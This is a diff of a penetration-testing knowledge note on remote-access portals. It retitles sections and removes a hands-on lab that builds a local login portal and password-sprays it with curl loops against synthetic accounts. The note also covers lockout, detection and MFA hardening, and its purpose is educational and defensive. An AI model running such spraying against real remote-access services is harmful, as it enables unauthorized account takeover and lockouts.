@@ -1,7 +1,7 @@
 ---
 title: "Remote Access Security Testing"
 aliases: ["Remote Access Testing", "VPN Testing", "RDP Security Testing"]
-tags: [tree/offensive, cyber/offensive/network-pentest, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/network-pentest, type/technique, difficulty/medium]
 Domain: "[[Network Penetration Testing]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 External Network Pentesting -> Service Enumeration -> Layer 2 & 3 Network Attacks -> Remote Access Security Testing -> Internal Network Pentesting
 
-## Start at Zero: The Doors Meant to Let People In
+## The Doors Meant to Let People In
 
 Every organization needs to let remote employees in, so it deliberately exposes **remote-access services** — VPN gateways, RDP, SSH, Citrix, and remote-management portals. These are unique on the perimeter: unlike an accidentally-exposed database, they are *supposed* to be internet-facing, which means they must be extraordinarily well-authenticated, because a single credential that works here is a direct route from the internet into the internal network.
 
@@ -64,7 +64,7 @@ flowchart TD
     I --> N["Pivot -> Internal Network Pentesting"]
 ```
 
-## Failure Modes and Interpretation
+## When password spraying becomes denial of service
 
 - **Account lockout = denial of service.** Aggressive spraying can lock out real employees, disrupting the business and burning the engagement's goodwill. Stay well under thresholds and coordinate.
 - **Detection is near-certain for volume.** Spraying and stuffing produce a distinctive burst of failed logins across many accounts — modern identity providers alarm on exactly this. Slow, distributed spraying evades thresholds but not a patient analyst.
@@ -80,104 +80,13 @@ flowchart TD
 - **Reduce the exposed portal count.** Every internet-facing remote-access service is a target; consolidating to one well-hardened, MFA-enforced gateway shrinks the surface.
 - **This is the perimeter breach that skips the exploit** — which is why remote-access hardening is disproportionately important: it closes the easiest path from internet to internal.
 
-## Authorized Lab: Test an Auth Portal You Build
+## Summary
 
-> [!info] Runs on one Linux machine — builds a login portal with a lockout policy locally, then sprays it
-> The portal binds to loopback; all "accounts" are synthetic. Step 5 removes it.
+You should now be able to:
 
-### Step 1 — Build a portal with a lockout threshold (3 attempts)
-
-```bash
-cat > /tmp/portal.py << 'EOF'
-import http.server, urllib.parse, json
-users = {"alice":"S3cret!","bob":"Winter2026","carol":"Passw0rd"}   # synthetic
-fails = {}
-class H(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        n = int(self.headers.get("Content-Length",0)); body = self.rfile.read(n).decode()
-        q = urllib.parse.parse_qs(body); u=q.get("u",[""])[0]; p=q.get("p",[""])[0]
-        if fails.get(u,0) >= 3:
-            self.send_response(423); self.end_headers(); self.wfile.write(b"LOCKED"); return
-        if users.get(u)==p:
-            fails[u]=0; self.send_response(200); self.end_headers(); self.wfile.write(b"AUTH OK")
-        else:
-            fails[u]=fails.get(u,0)+1; self.send_response(401); self.end_headers(); self.wfile.write(b"DENIED")
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8090),H).serve_forever()
-EOF
-python3 /tmp/portal.py &>/dev/null &
-sleep 1; echo "portal up on 127.0.0.1:8090 (lockout after 3 fails, no MFA)"
-```
-
-```text
-portal up on 127.0.0.1:8090 (lockout after 3 fails, no MFA)
-```
-
-### Step 2 — Naive brute-force locks the account (the wrong approach)
-
-```bash
-for p in wrong1 wrong2 wrong3 wrong4; do
-  echo "alice/$p -> $(curl -s -X POST -d "u=alice&p=$p" http://127.0.0.1:8090/)"
-done
-```
-
-```text
-alice/wrong1 -> DENIED
-alice/wrong2 -> DENIED
-alice/wrong3 -> DENIED
-alice/wrong4 -> LOCKED
-```
-
-Four guesses against one account locked it — a denial of service, and the account is now unusable. This is exactly what you must *avoid*.
-
-### Step 3 — Password spraying defeats the lockout by design
-
-```bash
-# one password across all users, so each account sees only ONE attempt
-for u in bob carol dave; do
-  r=$(curl -s -X POST -d "u=$u&p=Winter2026" http://127.0.0.1:8090/)
-  echo "$u/Winter2026 -> $r"
-done
-```
-
-```text
-bob/Winter2026 -> AUTH OK
-carol/Winter2026 -> DENIED
-dave/Winter2026 -> DENIED
-```
-
-One common password sprayed across the user list hit `bob` — **authenticated, no lockout triggered**, because each account saw a single attempt. That single valid credential is a foothold into the network. This is why spraying, not brute-force, is the real technique.
-
-### Step 4 — Show why MFA would stop it
-
-```bash
-echo "bob's password is now known. With MFA, 'AUTH OK' would still require a second factor bob controls."
-echo "The finding: portal enforces lockout but NOT MFA -> spraying yields access. Recommendation: enforce MFA."
-```
-
-```text
-bob's password is now known. With MFA, 'AUTH OK' would still require a second factor bob controls.
-The finding: portal enforces lockout but NOT MFA -> spraying yields access. Recommendation: enforce MFA.
-```
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/portal.py; wait 2>/dev/null
-curl -s -o /dev/null -w "portal gone: %{http_code}\n" --max-time 2 http://127.0.0.1:8090/ 2>&1 | grep -o 'gone.*' || echo "portal gone: connection refused"
-```
-
-```text
-portal gone: connection refused
-```
-
-**What you should now be able to do:** identify remote-access portals as the highest-value external target, explain why spraying defeats lockout where brute-force triggers it, demonstrate a spray that yields a credential without locking accounts, and articulate why MFA — not password policy — is the control that stops it.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why remote-access portals are uniquely dangerous (a credential = internal access, no exploit needed) and what MFA protects against.
-- **Operator:** Distinguish brute-force (locks accounts) from spraying (one password, many users), demonstrate a spray that authenticates without lockout, and report MFA presence and type.
-- **Root:** Explain why gateway CVEs trump authentication strength, why detection must be behavioral (spray pattern, impossible travel) rather than success/failure, and why remote-access hardening closes the easiest internet-to-internal path.
+- Explain why remote-access portals are uniquely dangerous (a credential = internal access, no exploit needed) and what MFA protects against.
+- Distinguish brute-force (locks accounts) from spraying (one password, many users), demonstrate a spray that authenticates without lockout, and report MFA presence and type.
+- Explain why gateway CVEs trump authentication strength, why detection must be behavioral (spray pattern, impossible travel) rather than success/failure, and why remote-access hardening closes the easiest internet-to-internal path.
 
 ---
 > 🔼 Up: [[Network Penetration Testing]]
